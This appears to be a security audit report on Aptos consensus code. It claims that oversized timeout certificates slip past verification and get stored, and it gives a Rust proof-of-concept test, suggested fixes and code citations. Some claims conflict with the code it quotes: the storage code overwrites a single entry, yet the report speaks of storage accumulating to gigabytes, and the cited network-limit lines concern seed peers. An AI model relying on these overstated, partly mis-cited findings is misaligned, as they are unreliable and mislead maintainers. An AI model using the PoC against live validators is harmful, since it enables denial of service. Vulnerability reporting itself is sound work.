# Audit Report

## Title
Unbounded Timeout Certificate Storage Enables Storage/Memory Exhaustion Attack

## Summary
The `save_highest_2chain_timeout_certificate()` function stores timeout certificates without validating the size of the `rounds` vector, allowing attackers to craft malicious `TwoChainTimeoutCertificate` objects with excessively large round vectors (up to 524 KB) that pass cryptographic verification but consume disproportionate storage and memory resources.

## Finding Description

The vulnerability exists in the consensus timeout certificate storage mechanism. When a `TwoChainTimeoutCertificate` is received from the network and stored, there is no validation that the `rounds` vector size matches the actual number of signers in the aggregated signature.

**Attack Flow:**

1. **Malicious TC Construction**: An attacker crafts a `TwoChainTimeoutCertificate` where:
   - The `AggregateSignature` has minimal bits set (e.g., exactly 2f+1 validators for quorum)
   - The `rounds` vector is padded to maximum size (65,536 entries × 8 bytes = 524 KB)

2. **Deserialization Bypass**: When the TC is deserialized from BCS bytes, the struct fields are populated directly without calling the constructor. [1](#0-0) 
   
   The constructor contains an assertion to enforce matching sizes, but it's bypassed during deserialization: [2](#0-1) 

3. **Verification Weakness**: During verification, the `get_voters_and_rounds()` method uses `zip()` which only processes the minimum of both iterator lengths: [3](#0-2) 
   
   With 3 signers and 65,536 rounds, only 3 pairs are verified. The verification logic never checks that all rounds were consumed: [4](#0-3) 

4. **Unchecked Storage**: The oversized TC passes verification and is stored without size validation: [5](#0-4) 
   
   The storage layer simply stores the raw bytes without size checks: [6](#0-5) 

**Broken Invariant**: This violates the documented invariant: "Resource Limits: All operations must respect gas, storage, and computational limits."

## Impact Explanation

**Medium Severity** - This vulnerability enables resource exhaustion attacks:

1. **Storage Exhaustion**: Each malicious TC consumes ~524 KB instead of the expected ~8 KB (65× amplification). An attacker can send one malicious TC per epoch, accumulating gigabytes of wasted storage over time.

2. **Memory Exhaustion**: When nodes load recovery data on restart, oversized TCs are deserialized into memory: [7](#0-6) 

3. **Database Performance Degradation**: Larger database entries slow down RocksDB read/write operations, affecting consensus performance.

4. **Denial of Service**: Sustained attacks can fill validator disk space or exhaust memory, causing node crashes and network instability.

This meets **Medium severity** criteria: "State inconsistencies requiring intervention" - operators would need to manually prune malicious TCs and potentially restore from clean backups.

## Likelihood Explanation

**High Likelihood** - The attack is easily executable:

1. **Low Barrier**: Any network peer can send malicious TCs in `SyncInfo` messages without privileged access
2. **No Authentication**: Network-level message size limits (~61 MB) permit the attack: [8](#0-7) 
3. **Automatic Processing**: Validators automatically process and store TCs from sync messages
4. **Persistent Impact**: Once stored, malicious TCs persist across node restarts
5. **Validator Set Size**: With max 65,536 validators, the rounds vector can legitimately grow very large, making detection difficult

## Recommendation

**Fix 1 - Add Size Validation During Deserialization:**

Implement a custom `Deserialize` for `AggregateSignatureWithRounds` that enforces the invariant:

```rust
impl<'de> Deserialize<'de> for AggregateSignatureWithRounds {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: serde::Deserializer<'de>,
    {
        #[derive(Deserialize)]
        struct AggregateSignatureWithRoundsRaw {
            sig: AggregateSignature,
            rounds: Vec<Round>,
        }
        
        let raw = AggregateSignatureWithRoundsRaw::deserialize(deserializer)?;
        
        if raw.sig.get_num_voters() != raw.rounds.len() {
            return Err(serde::de::Error::custom(
                "rounds vector size must match number of voters"
            ));
        }
        
        Ok(Self {
            sig: raw.sig,
            rounds: raw.rounds,
        })
    }
}
```

**Fix 2 - Add Pre-Storage Validation:**

Add size validation before storing TCs: [5](#0-4) 

```rust
pub fn save_highest_2chain_timeout_certificate(&self, tc: Vec<u8>) -> Result<(), DbError> {
    // Validate size before storage (conservative limit based on max validator set)
    const MAX_TC_SIZE: usize = 1_048_576; // 1 MB
    if tc.len() > MAX_TC_SIZE {
        return Err(anyhow::anyhow!("Timeout certificate exceeds maximum size").into());
    }
    
    let mut batch = SchemaBatch::new();
    batch.put::<SingleEntrySchema>(&SingleEntryKey::Highest2ChainTimeoutCert, &tc)?;
    self.commit(batch)?;
    Ok(())
}
```

**Fix 3 - Enhanced Verification:**

Modify the verify method to ensure all rounds are validated: [4](#0-3) 

```rust
pub fn verify(&self, validators: &ValidatorVerifier) -> anyhow::Result<()> {
    // Ensure rounds vector size matches number of voters
    ensure!(
        self.signatures_with_rounds.sig().get_num_voters() == 
        self.signatures_with_rounds.rounds().len(),
        "Rounds vector size mismatch: expected {}, got {}",
        self.signatures_with_rounds.sig().get_num_voters(),
        self.signatures_with_rounds.rounds().len()
    );
    
    // ... existing verification logic ...
}
```

## Proof of Concept

```rust
#[test]
fn test_oversized_timeout_certificate_attack() {
    use aptos_consensus_types::timeout_2chain::*;
    use aptos_types::validator_verifier::random_validator_verifier;
    use aptos_crypto::bls12381;
    
    // Setup validator set
    let (signers, validators) = random_validator_verifier(4, None, false);
    
    // Create valid timeout
    let timeout = TwoChainTimeout::new(
        1, // epoch
        5, // round  
        QuorumCert::certificate_for_genesis()
    );
    
    // Create partial signatures (only 3 signers for quorum)
    let mut partial_tc = TwoChainTimeoutWithPartialSignatures::new(timeout.clone());
    for i in 0..3 {
        partial_tc.add(
            signers[i].author(),
            timeout.clone(),
            timeout.sign(&signers[i]).unwrap(),
        );
    }
    
    // Aggregate signatures normally
    let mut valid_tc = partial_tc.aggregate_signatures(&validators).unwrap();
    
    // ATTACK: Manually craft malicious TC by deserializing and reserializing
    // with padded rounds vector
    let serialized = bcs::to_bytes(&valid_tc).unwrap();
    
    // Deserialize to modify
    #[derive(serde::Deserialize, serde::Serialize)]
    struct MaliciousTwoChainTC {
        timeout: TwoChainTimeout,
        signatures_with_rounds: MaliciousAggSig,
    }
    
    #[derive(serde::Deserialize, serde::Serialize)]
    struct MaliciousAggSig {
        sig: AggregateSignature,
        rounds: Vec<u64>,
    }
    
    let mut malicious: MaliciousTwoChainTC = bcs::from_bytes(&serialized).unwrap();
    
    // Pad rounds vector to maximum size
    malicious.signatures_with_rounds.rounds.resize(65536, 0);
    
    let oversized_bytes = bcs::to_bytes(&malicious).unwrap();
    
    // Verify size amplification
    assert!(oversized_bytes.len() > 500_000); // ~524 KB
    println!("Malicious TC size: {} bytes", oversized_bytes.len());
    
    // Deserialize back to TwoChainTimeoutCertificate
    let deserialized_tc: TwoChainTimeoutCertificate = 
        bcs::from_bytes(&oversized_bytes).unwrap();
    
    // VULNERABILITY: Verification passes despite oversized rounds vector!
    assert!(deserialized_tc.verify(&validators).is_ok());
    
    // Storage would accept this oversized TC
    println!("Attack successful: oversized TC passes verification");
}
```

**Notes**

The vulnerability stems from a mismatch between the constructor's invariant enforcement (assertion at line 361) and the deserialization path which bypasses it. The verification logic's use of `zip()` silently truncates excess rounds, creating a validation gap. The maximum validator set size of 65,536 enables significant amplification (65× storage overhead). This is particularly concerning because timeout certificates are stored persistently and loaded during node recovery, making the impact cumulative across restarts.

### Citations

**File:** consensus/consensus-types/src/timeout_2chain.rs (L141-183)
```rust
    pub fn verify(&self, validators: &ValidatorVerifier) -> anyhow::Result<()> {
        let hqc_round = self.timeout.hqc_round();
        // Verify the highest timeout validity.
        let (timeout_result, sig_result) = rayon::join(
            || self.timeout.verify(validators),
            || {
                let timeout_messages: Vec<_> = self
                    .signatures_with_rounds
                    .get_voters_and_rounds(
                        &validators
                            .get_ordered_account_addresses_iter()
                            .collect_vec(),
                    )
                    .into_iter()
                    .map(|(_, round)| TimeoutSigningRepr {
                        epoch: self.timeout.epoch(),
                        round: self.timeout.round(),
                        hqc_round: round,
                    })
                    .collect();
                let timeout_messages_ref: Vec<_> = timeout_messages.iter().collect();
                validators.verify_aggregate_signatures(
                    &timeout_messages_ref,
                    self.signatures_with_rounds.sig(),
                )
            },
        );
        timeout_result?;
        sig_result?;
        let signed_hqc = self
            .signatures_with_rounds
            .rounds()
            .iter()
            .max()
            .ok_or_else(|| anyhow::anyhow!("Empty rounds"))?;
        ensure!(
            hqc_round == *signed_hqc,
            "Inconsistent hqc round, qc has round {}, highest signed round {}",
            hqc_round,
            *signed_hqc
        );
        Ok(())
    }
```

**File:** consensus/consensus-types/src/timeout_2chain.rs (L353-357)
```rust
#[derive(Debug, Clone, Serialize, Deserialize, Eq, PartialEq)]
pub struct AggregateSignatureWithRounds {
    sig: AggregateSignature,
    rounds: Vec<Round>,
}
```

**File:** consensus/consensus-types/src/timeout_2chain.rs (L360-362)
```rust
    pub fn new(sig: AggregateSignature, rounds: Vec<Round>) -> Self {
        assert_eq!(sig.get_num_voters(), rounds.len());
        Self { sig, rounds }
```

**File:** consensus/consensus-types/src/timeout_2chain.rs (L379-388)
```rust
    pub fn get_voters_and_rounds(
        &self,
        ordered_validator_addresses: &[AccountAddress],
    ) -> Vec<(AccountAddress, Round)> {
        self.sig
            .get_signers_addresses(ordered_validator_addresses)
            .into_iter()
            .zip(self.rounds.clone())
            .collect()
    }
```

**File:** consensus/src/consensusdb/mod.rs (L108-113)
```rust
    pub fn save_highest_2chain_timeout_certificate(&self, tc: Vec<u8>) -> Result<(), DbError> {
        let mut batch = SchemaBatch::new();
        batch.put::<SingleEntrySchema>(&SingleEntryKey::Highest2ChainTimeoutCert, &tc)?;
        self.commit(batch)?;
        Ok(())
    }
```

**File:** consensus/src/persistent_liveness_storage.rs (L519-547)
```rust
    fn start(&self, order_vote_enabled: bool, window_size: Option<u64>) -> LivenessStorageData {
        info!("Start consensus recovery.");
        let raw_data = self
            .db
            .get_data()
            .expect("unable to recover consensus data");

        let last_vote = raw_data
            .0
            .map(|bytes| bcs::from_bytes(&bytes[..]).expect("unable to deserialize last vote"));

        let highest_2chain_timeout_cert = raw_data.1.map(|b| {
            bcs::from_bytes(&b).expect("unable to deserialize highest 2-chain timeout cert")
        });
        let blocks = raw_data.2;
        let quorum_certs: Vec<_> = raw_data.3;
        let blocks_repr: Vec<String> = blocks.iter().map(|b| format!("\n\t{}", b)).collect();
        info!(
            "The following blocks were restored from ConsensusDB : {}",
            blocks_repr.concat()
        );
        let qc_repr: Vec<String> = quorum_certs
            .iter()
            .map(|qc| format!("\n\t{}", qc))
            .collect();
        info!(
            "The following quorum certs were restored from ConsensusDB: {}",
            qc_repr.concat()
        );
```

**File:** consensus/src/persistent_liveness_storage.rs (L598-605)
```rust
    fn save_highest_2chain_timeout_cert(
        &self,
        highest_timeout_cert: &TwoChainTimeoutCertificate,
    ) -> Result<()> {
        Ok(self
            .db
            .save_highest_2chain_timeout_certificate(bcs::to_bytes(highest_timeout_cert)?)?)
    }
```

**File:** config/src/config/network_config.rs (L98-101)
```rust
    /// trusted peers set.  TODO: Replace usage in configs with `seeds` this is for backwards compatibility
    pub seed_addrs: HashMap<PeerId, Vec<NetworkAddress>>,
    /// The initial peers to connect to prior to onchain discovery
    pub seeds: PeerSet,
```
